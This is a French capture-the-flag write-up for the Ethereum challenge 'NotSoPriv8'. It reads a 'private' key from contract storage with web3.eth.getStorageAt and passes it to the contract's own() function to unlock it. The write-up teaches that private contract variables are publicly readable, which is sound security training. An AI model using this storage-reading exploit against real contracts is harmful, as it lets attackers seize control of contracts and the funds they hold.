# Ethereum - NotSoPriv8
## 35 Points
### "Tutoreum" again ?

## Énoncé
Everything is public in the Ethereum blockchain...

## Solution

L'objectif ici est exactement celui du challenge Ethereum - Tutoreum, sauf que cette fois ci, la valeur **key** est en **private**. Il faut donc trouver un moyen de passer **locked** à false.
```
level.locked().then(console.log)
true
```

On va donc essayer de lire la valeur de key dans le storage web3 du contract:

```
web3.eth.getStorageAt('0x76a4cd52a4bd14eeb3d650aa367d4ea94097c115', 0, (e, v) => console.log(web3.toAscii(v)))
{#²'úbºh0ÈÖs¬M1øâ¦£ìL1ÞQ¢
```

Bingo, on obtien quelque chose qui ressemble à du Bytes32, on va tester cela en utilisant ce qu'on a trouvé dans la fonction **own** pour voir si ça va marcher:
```
level.own("�{#²'ú�bºh0��ÈÖs¬M1øâ��¦£ìL1ÞQ¢�").then(console.log)

level.locked().then(console.log)
false
```

Cela a parfaitement marché, locked est passé à false, on a donc réussi le challenge.